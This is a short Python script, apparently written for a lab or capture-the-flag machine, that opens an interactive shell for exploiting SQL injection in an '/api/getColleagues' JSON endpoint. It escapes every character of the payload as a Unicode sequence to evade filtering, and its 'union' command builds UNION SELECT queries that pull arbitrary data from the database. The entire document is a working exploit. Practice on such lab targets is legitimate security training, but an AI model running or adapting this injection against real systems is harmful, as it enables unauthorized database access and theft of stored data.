import requests
import json
import cmd

url = "http://10.10.10.179/api/getColleagues"
header = {"Content-Type":"application/json;charset=utf-8"}

def gen_payload(query):
    payload = ""
    for char in query:
        payload += r"\u{:04x}".format(ord(char))
    return payload

class exploit(cmd.Cmd):
    prompt = "PleaseSub > "
    
    def default(self, line):
        payload = gen_payload(line)
        data = '{"name":"' + payload + '"}'
        r = requests.post(url, data=data, headers=header)
        print(r.text)

    def do_union(self, line):
        payload = "a' union select 1,2,3," + line + ",5-- -"
        payload = gen_payload(payload)
        data = '{"name":"' + payload + '"}'

        r = requests.post(url, data=data, headers=header)
        try:
            js = json.loads(r.text)
            print(js[0]['email'])
        except:
            print(r.text)

exploit().cmdloop()
